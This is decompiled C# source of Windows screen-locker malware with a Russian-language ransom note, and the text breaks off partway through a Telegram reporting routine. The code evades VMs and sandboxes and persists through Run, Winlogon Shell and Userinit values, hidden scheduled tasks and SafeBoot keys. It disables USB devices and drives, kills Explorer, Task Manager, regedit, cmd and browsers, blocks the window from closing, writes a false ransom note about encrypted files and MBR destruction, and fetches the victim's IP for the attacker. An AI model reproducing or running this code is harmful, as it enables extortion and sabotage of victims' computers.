using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ns0;

[DesignerGenerated]
public class GForm1 : Form
{
	private IDisposable idisposable_0;

	public string[] string_0;

	public string[] string_1;

	public string[] string_2;

	public string string_3;

	public string string_4;

	public string string_5;

	public string string_6;

	public string string_7;

	public string string_8;

	public string string_9;

	public string string_10;

	public string string_11;

	public object object_0;

	public GForm1()
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		((Form)this).Load += GForm1_Load;
		((Form)this).FormClosing += new FormClosingEventHandler(GForm1_FormClosing);
		string_0 = new string[21]
		{
			"D", "H", "Z", "Q", "W", "L", "K", "J", "G", "S",
			"I", "T", "V", "W", "R", "X", "P", "E", "B", "M",
			"F"
		};
		string_1 = new string[14]
		{
			"telegram", "discord", "skype", "zoom", "msedge", "chrome", "opera", "browser", "firefox", "javaw",
			"steam", "steamwebhelper", "steamservice", "EpicGamesLauncher"
		};
		string_2 = new string[8] { "AWindowsService.exe", "taskhost.exe", "windowsx-c.exe", "System.exe", "_default64.exe", "native.exe", "ux-cryptor.exe", "crypt0rsx.exe" };
		string_3 = "attrib $h $s $r $i /D ";
		string_4 = Environment.ExpandEnvironmentVariables("%temp%\\$unlocker_id.ux-cryptobytes");
		string_5 = "true";
		string_6 = "true";
		string_7 = "%BOTTOKEN%";
		string_8 = "%CHATID%";
		string_9 = "true";
		string_10 = "true";
		string_11 = "true";
		object_0 = false;
		method_0();
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && idisposable_0 != null)
			{
				idisposable_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void method_0()
	{
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(GForm1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).AutoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((Control)this).BackColor = Color.White;
		((Form)this).ClientSize = new Size(120, 0);
		((Form)this).Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
		((Form)this).MaximizeBox = false;
		((Form)this).MinimizeBox = false;
		((Control)this).Name = "loader";
		((Form)this).ShowIcon = false;
		((Form)this).ShowInTaskbar = false;
		((Form)this).StartPosition = (FormStartPosition)0;
		((Control)this).Text = "System32";
		((Form)this).TransparencyKey = Color.White;
		((Form)this).WindowState = (FormWindowState)1;
		((Control)this).ResumeLayout(false);
	}

	private void GForm1_Load(object sender, EventArgs e)
	{
		object[] array = new object[3]
		{
			new Class3(),
			new Class4(),
			new Class5()
		};
		bool flag = true;
		Conversions.ToBoolean((object)(Environment.MachineName.Contains("VPS") || flag == Environment.MachineName.Contains("VDS") || Conversions.ToBoolean(Operators.CompareObjectEqual((object)flag, NewLateBinding.LateGet(array[0], (Type)null, "VM_Detected", new object[0], (string[])null, (Type[])null, (bool[])null), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual((object)flag, NewLateBinding.LateGet(array[1], (Type)null, "AnyRun_Detected", new object[0], (string[])null, (Type[])null, (bool[])null), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual((object)flag, NewLateBinding.LateGet(array[2], (Type)null, "SandBox_Detected", new object[0], (string[])null, (Type[])null, (bool[])null), false))));
		checked
		{
			if (!Interaction.Command().Contains("debug"))
			{
				try
				{
					RegistryKey[] obj = new RegistryKey[4]
					{
						((ServerComputer)Class1.Class0_0).Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true),
						((ServerComputer)Class1.Class0_0).Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", writable: true),
						((ServerComputer)Class1.Class0_0).Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true),
						((ServerComputer)Class1.Class0_0).Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", writable: true)
					};
					obj[0].SetValue("System32", "\"" + Application.ExecutablePath + "\"");
					obj[0].SetValue("WindowsDefender", "\"" + Application.ExecutablePath + "\"");
					obj[0].SetValue("SystemUpdate", "\"" + Application.ExecutablePath + "\"");
					obj[1].SetValue("System3264Wow", "\"" + Application.ExecutablePath + "\"");
					obj[2].SetValue("Shell", "\"" + Application.ExecutablePath + "\"");
					obj[2].SetValue("Userinit", "\"" + Application.ExecutablePath + "\",C:\\Windows\\system32\\userinit.exe");
					obj[3].SetValue("a", "YOU ARE HACKED!\\1");
					obj[3].SetValue("b", "HAHAHAHAHAHAHA\\1");
					obj[3].SetValue("c", "BIBORAN.com\\1");
					obj[3].SetValue("MRUList", "abc");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					RegistryKey registryKey = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					if (registryKey != null)
					{
						registryKey.SetValue("WindowsUpdateService", "\"" + Application.ExecutablePath + "\"");
						registryKey.Close();
					}
				}
				catch
				{
				}
				try
				{
					RegistryKey registryKey2 = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
					if (registryKey2 != null)
					{
						string text = "";
						try
						{
							text = Conversions.ToString(registryKey2.GetValue("Shell", "explorer.exe"));
						}
						catch
						{
							text = "explorer.exe";
						}
						if (!text.Contains(Application.ExecutablePath))
						{
							registryKey2.SetValue("Shell", "\"" + Application.ExecutablePath + "\"," + text);
						}
						registryKey2.Close();
					}
				}
				catch
				{
				}
				try
				{
					if ("true" == "true")
					{
						method_4();
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				try
				{
					method_19();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				string text2 = ((ServerComputer)Class1.Class0_0).Info.OSFullName.Trim().ToLower();
				Thread thread = (new Thread[1]
				{
					new Thread((ThreadStart)delegate
					{
						string text3 = "/S *";
						string_3 += text3;
					})
				})[0];
				bool flag2 = true;
				if (!text2.Contains("10") && flag2 != text2.Contains("11"))
				{
					thread.Start();
				}
				thread = null;
				try
				{
					int num = 1;
					do
					{
						((ServerComputer)Class1.Class0_0).Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true).SetValue("WIN32_" + Conversions.ToString(num), string_2[num - 1]);
						num++;
					}
					while (num <= 8);
					try
					{
						if (!File.Exists(string_4))
						{
							File.WriteAllText(string_4, DateAndTime.TimeString.Replace(":", null));
						}
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						object_0 = true;
						ProjectData.ClearProjectError();
					}
					int num2 = 0;
					Screen[] allScreens = Screen.AllScreens;
					foreach (Screen val in allScreens)
					{
						num2++;
						if (num2 == 1)
						{
							GForm2 gForm = new GForm2();
							Rectangle workingArea = val.WorkingArea;
							((Control)gForm).Top = workingArea.Top;
							((Control)gForm).Left = workingArea.Left;
							((Control)gForm).Show();
							((Form)gForm).Activate();
						}
						else
						{
							GForm0 gForm2 = new GForm0();
							Rectangle workingArea2 = val.WorkingArea;
							((Control)gForm2).Top = workingArea2.Top;
							((Control)gForm2).Left = workingArea2.Left;
							((Control)gForm2).Show();
							((Form)gForm2).Activate();
						}
					}
					method_1();
					method_2();
					method_5();
					if (Operators.CompareString(string_6, "true", false) == 0)
					{
						method_6();
					}
					if (Operators.CompareString(string_9, "true", false) == 0)
					{
						method_8();
					}
					if (Operators.CompareString(string_10, "true", false) == 0)
					{
						method_9();
					}
					if (Operators.CompareString(string_11, "true", false) == 0)
					{
						Thread thread2 = new Thread((ThreadStart)delegate
						{
							method_10();
						});
						thread2.IsBackground = true;
						thread2.Start();
					}
					if (!string.IsNullOrEmpty(string_7) && !string.IsNullOrEmpty(string_8) && Operators.CompareString(string_7, "%BOTTOKEN%", false) != 0 && Operators.CompareString(string_8, "%CHATID%", false) != 0)
					{
						method_7();
					}
					Process[] processes = Process.GetProcesses();
					int num4 = string_1.Length - 1;
					for (int num5 = 0; num5 <= num4; num5++)
					{
						try
						{
							Process[] array2 = processes;
							for (int num3 = 0; num3 < array2.Length; num3 = unchecked(num3 + 1))
							{
								Process process = array2[num3];
								if (process.ProcessName.ToLower().Contains(string_1[num5].ToLower()))
								{
									process.Kill();
								}
								process = null;
							}
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
					}
					Thread thread3 = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								method_5();
								Thread.Sleep(1000);
							}
							catch (Exception)
							{
							}
						}
					});
					thread3.IsBackground = true;
					thread3.Start();
					return;
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
					return;
				}
			}
			if (!File.Exists(string_4))
			{
				File.WriteAllText(string_4, "121212");
			}
			((Control)Class1.MyForms_0._o_program).Show();
		}
	}

	public void method_1()
	{
		checked
		{
			try
			{
				string text = string_3.Replace("$", "+") + " & echo [%RANDOM%] Упс! Вы подверглись масштабной хакерской атаке и теперь Ваш компьютер заблокирован, а все имеющиеся диски и файлы на них зашифрованы хакерской группировкой. Любые действия, связанные с попыткой обмануть систему нанесут непоправимый вред Вашему компьютеру и приведут к потере всех важных файлов без возможности восстановления. При попытке снять блокировку MBR ( главный загрузчик материнки) будет снесён и будет подана рекурсивная нагрузка на ваш процессор, что приведёт к его неисправности. У вас есть 48 часов с момента запуска чтобы ввести код 1>info-Locker.txt & attrib -h +s +r info-Locker.txt";
				string[] array = new string[5] { "%userprofile%\\desktop", "%systemdrive%\\Users\\Public\\Desktop", "%userprofile%\\downloads", "%userprofile%\\documents", "%userprofile%" };
				int num = string_0.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					if (Directory.Exists(string_0[i] + ":\\"))
					{
						string text2 = string_0[i] + ":";
						Interaction.Shell("cmd.exe /c " + text2 + " & " + text, (AppWinStyle)0, false, -1);
					}
				}
				int num2 = array.Length - 1;
				for (int j = 0; j <= num2; j++)
				{
					Interaction.Shell("cmd.exe /c cd \"" + array[j] + "\"&" + text, (AppWinStyle)0, false, -1);
				}
			}
			catch (Exception)
			{
			}
		}
	}

	public void method_2()
	{
		try
		{
			Interaction.Shell("taskkill.exe /im Explorer.exe /f", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void GForm1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void method_3()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)"0xC00000FD: The memory location at the specified address returned \"null\"", (MsgBoxStyle)17, (object)Application.ExecutablePath);
		ProjectData.EndApp();
	}

	private void method_4()
	{
		try
		{
			string executablePath = Application.ExecutablePath;
			string value = "\"" + executablePath + "\"";
			try
			{
				RegistryKey localMachine = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine;
				RegistryKey registryKey = localMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				if (registryKey == null)
				{
					registryKey = localMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
				}
				registryKey.SetValue("WindowsUpdateService", value);
				registryKey.SetValue("SystemSecurityService", value);
				registryKey.SetValue("WindowsDefenderService", value);
				registryKey.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				string[] array = new string[5] { "WindowsUpdateService", "SystemSecurityService", "WindowsDefenderService", "MicrosoftEdgeUpdate", "SystemMaintenance" };
				foreach (string text in array)
				{
					try
					{
						string contents = "<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Principals><Principal id=\"Author\"><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>4</Priority></Settings><Actions Context=\"Author\"><Exec><Command>" + executablePath.Replace("\\", "\\\\") + "</Command></Exec></Actions></Task>";
						string text2 = Path.Combine(Path.GetTempPath(), "task_" + Guid.NewGuid().ToString() + ".xml");
						File.WriteAllText(text2, contents);
						ProcessStartInfo processStartInfo = new ProcessStartInfo();
						processStartInfo.FileName = "schtasks.exe";
						processStartInfo.Arguments = "/create /tn \"" + text + "\" /xml \"" + text2 + "\" /f";
						processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						processStartInfo.CreateNoWindow = true;
						processStartInfo.UseShellExecute = false;
						Process.Start(processStartInfo);
						Thread.Sleep(500);
						try
						{
							if (File.Exists(text2))
							{
								File.Delete(text2);
							}
						}
						catch
						{
						}
					}
					catch
					{
					}
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				RegistryKey registryKey2 = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal", writable: true);
				if (registryKey2 != null)
				{
					string[] array = new string[5] { "WindowsUpdateService", "SystemSecurityService", "WindowsDefenderService", "MicrosoftEdgeUpdate", "SystemMaintenance" };
					foreach (string subkey in array)
					{
						try
						{
							RegistryKey registryKey3 = registryKey2.CreateSubKey(subkey);
							registryKey3.SetValue("", "Service");
							registryKey3.Close();
						}
						catch
						{
						}
					}
					registryKey2.Close();
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				RegistryKey registryKey4 = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network", writable: true);
				if (registryKey4 != null)
				{
					string[] array = new string[5] { "WindowsUpdateService", "SystemSecurityService", "WindowsDefenderService", "MicrosoftEdgeUpdate", "SystemMaintenance" };
					foreach (string subkey2 in array)
					{
						try
						{
							RegistryKey registryKey5 = registryKey4.CreateSubKey(subkey2);
							registryKey5.SetValue("", "Service");
							registryKey5.Close();
						}
						catch
						{
						}
					}
					registryKey4.Close();
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
				RegistryKey registryKey6 = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal", writable: true);
				if (registryKey6 != null)
				{
					try
					{
						RegistryKey registryKey7 = registryKey6.CreateSubKey("USBSTOR");
						registryKey7.SetValue("", "Driver");
						registryKey7.Close();
						registryKey6.DeleteSubKey("USBSTOR", throwOnMissingSubKey: false);
					}
					catch
					{
					}
					registryKey6.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey8 = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network", writable: true);
				if (registryKey8 != null)
				{
					try
					{
						RegistryKey registryKey9 = registryKey8.CreateSubKey("USBSTOR");
						registryKey9.SetValue("", "Driver");
						registryKey9.Close();
						registryKey8.DeleteSubKey("USBSTOR", throwOnMissingSubKey: false);
					}
					catch
					{
					}
					registryKey8.Close();
				}
			}
			catch
			{
			}
			try
			{
				string[] array2 = new string[9] { "USB", "USBHUB", "USBHUB3", "USBCCGP", "USBSTOR", "USBPORT", "USBEHCI", "USBOHCI", "USBUHCI" };
				RegistryKey registryKey10 = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal", writable: true);
				if (registryKey10 != null)
				{
					string[] array = array2;
					foreach (string subkey3 in array)
					{
						try
						{
							registryKey10.DeleteSubKey(subkey3, throwOnMissingSubKey: false);
						}
						catch
						{
						}
					}
					registryKey10.Close();
				}
				RegistryKey registryKey11 = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network", writable: true);
				if (registryKey11 != null)
				{
					string[] array = array2;
					foreach (string subkey4 in array)
					{
						try
						{
							registryKey11.DeleteSubKey(subkey4, throwOnMissingSubKey: false);
						}
						catch
						{
						}
					}
					registryKey11.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey12 = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\RemovableStorageDevices", writable: true);
				if (registryKey12 == null)
				{
					registryKey12 = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\RemovableStorageDevices");
				}
				string[] array = new string[3] { "{53f56307-b6bf-11d0-94f2-00a0c91efb8b}", "{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}", "{53f56311-b6bf-11d0-94f2-00a0c91efb8b}" };
				foreach (string subkey5 in array)
				{
					try
					{
						RegistryKey registryKey13 = registryKey12.CreateSubKey(subkey5);
						registryKey13.SetValue("Deny_Read", 1, RegistryValueKind.DWord);
						registryKey13.SetValue("Deny_Write", 1, RegistryValueKind.DWord);
						registryKey13.SetValue("Deny_Execute", 1, RegistryValueKind.DWord);
						registryKey13.Close();
					}
					catch
					{
					}
				}
				registryKey12.SetValue("Deny_All", 1, RegistryValueKind.DWord);
				registryKey12.Close();
			}
			catch
			{
			}
			try
			{
				string[] array = new string[9] { "USBSTOR", "USB", "USBHUB", "USBHUB3", "USBCCGP", "USBPORT", "USBEHCI", "USBOHCI", "USBUHCI" };
				foreach (string text3 in array)
				{
					try
					{
						RegistryKey registryKey14 = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\" + text3, writable: true);
						if (registryKey14 != null)
						{
							registryKey14.SetValue("Start", 4, RegistryValueKind.DWord);
							registryKey14.SetValue("Type", 1, RegistryValueKind.DWord);
							registryKey14.Close();
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}

	public void method_5()
	{
		try
		{
			string[] array = new string[3] { "taskmgr", "cmd", "regedit" };
			Process[] processes = Process.GetProcesses();
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					Process[] array2 = processes;
					for (int j = 0; j < array2.Length; j++)
					{
						Process process = array2[j];
						if (process.ProcessName.ToLower() == array[i].ToLower())
						{
							process.Kill();
						}
						process = null;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void method_6()
	{
		try
		{
			RegistryKey localMachine = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine;
			try
			{
				RegistryKey registryKey = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\USBSTOR", writable: true);
				if (registryKey == null)
				{
					registryKey = localMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\USBSTOR");
				}
				registryKey.SetValue("Start", 4, RegistryValueKind.DWord);
				registryKey.SetValue("Type", 1, RegistryValueKind.DWord);
				registryKey.SetValue("ErrorControl", 0, RegistryValueKind.DWord);
				registryKey.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				RegistryKey registryKey2 = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\USB", writable: true);
				if (registryKey2 == null)
				{
					registryKey2 = localMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\USB");
				}
				registryKey2.SetValue("Start", 4, RegistryValueKind.DWord);
				registryKey2.SetValue("Type", 1, RegistryValueKind.DWord);
				registryKey2.Close();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				RegistryKey registryKey3 = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\USBHUB", writable: true);
				if (registryKey3 == null)
				{
					registryKey3 = localMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\USBHUB");
				}
				registryKey3.SetValue("Start", 4, RegistryValueKind.DWord);
				registryKey3.SetValue("Type", 1, RegistryValueKind.DWord);
				registryKey3.Close();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			try
			{
				RegistryKey registryKey4 = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\USBHUB3", writable: true);
				if (registryKey4 == null)
				{
					registryKey4 = localMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\USBHUB3");
				}
				registryKey4.SetValue("Start", 4, RegistryValueKind.DWord);
				registryKey4.SetValue("Type", 1, RegistryValueKind.DWord);
				registryKey4.Close();
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
				RegistryKey registryKey5 = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\USBCCGP", writable: true);
				if (registryKey5 == null)
				{
					registryKey5 = localMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\USBCCGP");
				}
				registryKey5.SetValue("Start", 4, RegistryValueKind.DWord);
				registryKey5.SetValue("Type", 1, RegistryValueKind.DWord);
				registryKey5.Close();
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
			try
			{
				RegistryKey registryKey6 = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\USBPORT", writable: true);
				if (registryKey6 == null)
				{
					registryKey6 = localMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\USBPORT");
				}
				registryKey6.SetValue("Start", 4, RegistryValueKind.DWord);
				registryKey6.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey7 = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\USBEHCI", writable: true);
				if (registryKey7 == null)
				{
					registryKey7 = localMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\USBEHCI");
				}
				registryKey7.SetValue("Start", 4, RegistryValueKind.DWord);
				registryKey7.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey8 = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\USBOHCI", writable: true);
				if (registryKey8 == null)
				{
					registryKey8 = localMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\USBOHCI");
				}
				registryKey8.SetValue("Start", 4, RegistryValueKind.DWord);
				registryKey8.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey9 = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\USBUHCI", writable: true);
				if (registryKey9 == null)
				{
					registryKey9 = localMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Services\\USBUHCI");
				}
				registryKey9.SetValue("Start", 4, RegistryValueKind.DWord);
				registryKey9.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey10 = localMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\RemovableStorageDevices", writable: true);
				if (registryKey10 == null)
				{
					registryKey10 = localMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\RemovableStorageDevices");
				}
				registryKey10.SetValue("Deny_All", 1, RegistryValueKind.DWord);
				registryKey10.SetValue("Deny_Read", 1, RegistryValueKind.DWord);
				registryKey10.SetValue("Deny_Write", 1, RegistryValueKind.DWord);
				registryKey10.SetValue("Deny_Execute", 1, RegistryValueKind.DWord);
				registryKey10.Close();
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
			try
			{
				RegistryKey registryKey11 = localMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\RemovableStorageDevices\\{53f56307-b6bf-11d0-94f2-00a0c91efb8b}");
				registryKey11.SetValue("Deny_Read", 1, RegistryValueKind.DWord);
				registryKey11.SetValue("Deny_Write", 1, RegistryValueKind.DWord);
				registryKey11.SetValue("Deny_Execute", 1, RegistryValueKind.DWord);
				registryKey11.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey12 = localMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\RemovableStorageDevices\\{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}");
				registryKey12.SetValue("Deny_Read", 1, RegistryValueKind.DWord);
				registryKey12.SetValue("Deny_Write", 1, RegistryValueKind.DWord);
				registryKey12.SetValue("Deny_Execute", 1, RegistryValueKind.DWord);
				registryKey12.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey13 = localMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\RemovableStorageDevices\\{53f56311-b6bf-11d0-94f2-00a0c91efb8b}");
				registryKey13.SetValue("Deny_Read", 1, RegistryValueKind.DWord);
				registryKey13.SetValue("Deny_Write", 1, RegistryValueKind.DWord);
				registryKey13.SetValue("Deny_Execute", 1, RegistryValueKind.DWord);
				registryKey13.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey14 = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies", writable: true);
				if (registryKey14 == null)
				{
					registryKey14 = localMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\StorageDevicePolicies");
				}
				registryKey14.SetValue("WriteProtect", 1, RegistryValueKind.DWord);
				registryKey14.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey15 = localMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true);
				if (registryKey15 == null)
				{
					registryKey15 = localMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
				}
				registryKey15.SetValue("NoDriveTypeAutoRun", 255, RegistryValueKind.DWord);
				registryKey15.SetValue("NoAutorun", 1, RegistryValueKind.DWord);
				registryKey15.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey16 = localMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", writable: true);
				if (registryKey16 == null)
				{
					registryKey16 = localMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
				}
				registryKey16.SetValue("NoDrives", 67108862, RegistryValueKind.DWord);
				registryKey16.Close();
			}
			catch
			{
			}
			try
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/c sc config USBSTOR start= disabled & sc stop USBSTOR & sc config USBHUB start= disabled & sc stop USBHUB & sc config USBHUB3 start= disabled & sc stop USBHUB3",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					UseShellExecute = false
				});
			}
			catch
			{
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
	}

	public void method_7()
	{
		try
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				//IL_0069: Unknown result type (might be due to invalid IL or missing references)
				//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
				//IL_0126: Unknown result type (might be due to invalid IL or missing references)
				//IL_0083: Unknown result type (might be due to invalid IL or missing references)
				//IL_00e1: Unknown result type (might be due to invalid IL or missing references)
				//IL_0143: Unknown result type (might be due to invalid IL or missing references)
				//IL_0148: Unknown result type (might be due to invalid IL or missing references)
				try
				{
					Thread.Sleep(2000);
					string name = ((ServerComputer)Class1.Class0_0).Name;
					string text = "";
					try
					{
						using WebClient webClient = new WebClient();
						text = webClient.DownloadString("https://api.ipify.org");
					}
					catch (Exception)
					{
						text = "Не удалось получить";
					}
					try
					{
						_ = ((ServerComputer)Class1.Class0_0).Info.OSFullName;
					}
					catch (Exception)
					{
					}
